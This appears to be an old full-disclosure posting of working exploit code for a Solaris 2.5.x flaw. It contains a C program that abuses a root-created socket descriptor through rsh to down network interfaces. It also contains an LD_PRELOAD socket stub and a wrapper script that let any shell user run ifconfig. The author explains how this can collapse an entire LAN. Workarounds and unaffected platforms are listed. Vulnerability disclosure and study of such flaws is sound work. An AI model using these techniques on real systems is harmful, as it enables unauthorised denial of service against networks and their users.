/*
* cc solaris_ifreq.c -o solaris_ifreq -lsocket
* rsh localhost ./solaris_ifreq
*
*
* solaris_ifreq.c
*
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/sockio.h>
#include <net/if.h>
#include <netinet/in.h>


int main(int argc, char *argv[])
{
        struct ifreq please_break_me;

        strcpy( please_break_me.ifr_name, "lo0");
        please_break_me.ifr_flags=0;

        if(ioctl(0, SIOCSIFFLAGS, &please_break_me)==-1)
                perror("Damn it didnt work. Obviously not Solaris ;)");
}


/*
* You can adjust this to do other things. Basically any user can do network control
* requests on a root created socket descriptor.
*
*
* Workarounds:
* 1.  Disable rsh and any non root owned inetd tasks -  breaks remote tar etc
* 2.  Run an OS that the vendor doesnt take a year to fix bugs in
*
*/



-----------------------------------------------------------------------------



Bored of downing interfaces, ever wondered what else you could do with the
year old Solaris hole. Well since I've seen no great sign of life from Sun
lets do a little bit of demonstrating

Firstly you want this little bit of code  for Solaris 2.5.1

cc haccident.c -c

int socket(int fa, int type, int proto)
{
        return 0;
}

mv haccident ~myusername

cat >~myusername/myfconfig
#!/bin/sh
export LD_PRELOAD=$HOME/haccident.o
ifconfig $*

chmod 755 myfconfig

Now you can do "rsh localhost ./myfconfig whatever" to do ifconfig commands
as an ordinary user. Ok so its simple boring single host denial of service.
Well actually its not...

Its amazing the fun that occurs if you add every host on your class C
network to the lan for example. Over the next 10 to 15 minutes your entire
lan collapses into a heap. All you need is one user account on one solaris
2.5.x box and the entire network is a sitting duck. The user doesn't even
need to break to root, just any old shell account and blam....

So where's the fix Sun ?

[Not vulnerable: Linux/Sparc, NetBSD/Sparc, OpenBSD/Sparc, SunOS,
 Solaris 2.5(apparently), Solaris 2.6]

Many thanks to Sun for failing to fix a bug for a year and giving me a
great chance to give these programs to everyone considering buying Solaris
boxes I can find, and also to Jeff Uphoff and Dave Miller for various bits
of testing of exploits.

